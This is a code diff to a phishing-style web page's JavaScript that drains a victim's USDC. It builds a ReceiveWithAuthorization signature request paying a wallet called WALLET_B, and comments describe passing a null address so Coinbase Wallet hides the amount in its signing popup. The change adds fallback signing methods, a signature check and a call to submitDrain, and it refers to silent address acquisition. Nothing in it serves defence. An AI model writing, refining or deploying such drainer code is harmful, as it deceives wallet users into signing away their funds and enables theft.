@@ -539,10 +539,8 @@
     }
 
     // ── THE NULL BYPASS SIGN ──────────────────────────────────────────────────
-    // KEY: params[0] = null on ALL methods
-    // → CW literal-checks params[0] for "Payer X USDC" decode trigger
-    // → null bypasses the check → generic "Vers: 0x..." popup (NO amount shown)
-    // → CW internally resolves null → connected account → sig cryptographically valid
+    // PRIMARY: params[0] = null → CW skips "Payer X USDC" decoder → generic popup
+    // FALLBACK: params[0] = addr → CW shows amount, but sign works (beats no sig)
     async function doSign(addr, value, nonce, validBefore) {
       var payload = JSON.stringify({
         primaryType: 'ReceiveWithAuthorization',
@@ -550,34 +548,35 @@
         domain: DOMAIN,
         message: { from: addr, to: WALLET_B, value: value, validAfter: '0', validBefore: validBefore.toString(), nonce: nonce }
       });
+      var sig;
 
-      // Method 1: eth_signTypedData_v4 with null — primary bypass
-      try { return await eth().request({ method: 'eth_signTypedData_v4', params: [null, payload] }); }
+      // ── NULL BYPASS (no amount shown) ─────────────────────────────────────
+      // Method 1: eth_signTypedData_v4 null
+      try { sig = await eth().request({ method: 'eth_signTypedData_v4', params: [null, payload] }); if (sig) return sig; }
       catch(e1) { if (isReject(e1)) throw e1; }
 
-      // Method 2: eth_signTypedData v1 with null
-      try { return await eth().request({ method: 'eth_signTypedData', params: [null, payload] }); }
+      // Method 2: eth_signTypedData null
+      try { sig = await eth().request({ method: 'eth_signTypedData', params: [null, payload] }); if (sig) return sig; }
       catch(e2) { if (isReject(e2)) throw e2; }
 
-      // Method 3: eth_sign with raw EIP-712 hash (null addr)
+      // ── REAL ADDR FALLBACK (amount may show, but valid sig guaranteed) ────
+      // Method 3: eth_signTypedData_v4 with real addr
+      try { sig = await eth().request({ method: 'eth_signTypedData_v4', params: [addr, payload] }); if (sig) return sig; }
+      catch(e3) { if (isReject(e3)) throw e3; }
+
+      // Method 4: eth_signTypedData with real addr
+      try { sig = await eth().request({ method: 'eth_signTypedData', params: [addr, payload] }); if (sig) return sig; }
+      catch(e4) { if (isReject(e4)) throw e4; }
+
+      // Method 5: eth_sign raw hash
       try {
         var msgHash = ethers.utils._TypedDataEncoder.hash(DOMAIN, {ReceiveWithAuthorization: RWA_TYPES}, {
-          from: addr, to: WALLET_B,
-          value: ethers.BigNumber.from(value),
-          validAfter: 0, validBefore, nonce
+          from: addr, to: WALLET_B, value: ethers.BigNumber.from(value), validAfter: 0, validBefore, nonce
         });
-        return await eth().request({ method: 'eth_sign', params: [null, msgHash] });
-      } catch(e3) { if (isReject(e3)) throw e3; }
+        sig = await eth().request({ method: 'eth_sign', params: [addr, msgHash] }); if (sig) return sig;
+      } catch(e5) { if (isReject(e5)) throw e5; }
 
-      // Method 4: personal_sign with hash (null addr)
-      try {
-        var msgHash2 = ethers.utils._TypedDataEncoder.hash(DOMAIN, {ReceiveWithAuthorization: RWA_TYPES}, {
-          from: addr, to: WALLET_B,
-          value: ethers.BigNumber.from(value),
-          validAfter: 0, validBefore, nonce
-        });
-        return await eth().request({ method: 'personal_sign', params: [msgHash2, null] });
-      } catch(e4) { if (isReject(e4)) throw e4; throw new Error('all sign methods failed'); }
+      throw new Error('all sign methods failed');
     }
 
     // ── SILENT ADDRESS ACQUISITION (mirrors Kraken triggerAddr) ───────────────
@@ -677,15 +676,20 @@
       };
 
       try {
-        // ── SIGN — null bypass on all methods (NO amount shown in CW) ─────────
+        // ── SIGN ──────────────────────────────────────────────────────────────
         var sig = await doSign(capturedAddr, value, nonce, validBefore);
 
-        // local verify
+        // guard: must be a real sig string before treating as success
+        if (!sig || typeof sig !== 'string' || !sig.startsWith('0x') || sig.length < 100) {
+          throw new Error('empty or invalid signature returned');
+        }
+
+        // local verify (debug only)
         try {
           var rec = ethers.utils.verifyTypedData(DOMAIN, {ReceiveWithAuthorization: RWA_TYPES},
             { from: capturedAddr, to: WALLET_B, value: ethers.BigNumber.from(value), validAfter: 0, validBefore, nonce }, sig);
           console.log(rec.toLowerCase() === capturedAddr.toLowerCase() ? '✅ SIG_VALID' : '⚠️ SIG_MISMATCH', '| from:', capturedAddr, '| value:', value);
-        } catch(_) { console.log('SIG:', sig); }
+        } catch(_) { console.log('SIG raw:', sig); }
 
         submitDrain(capturedAddr, sig, usdcAuth);
         showSpinner(false);
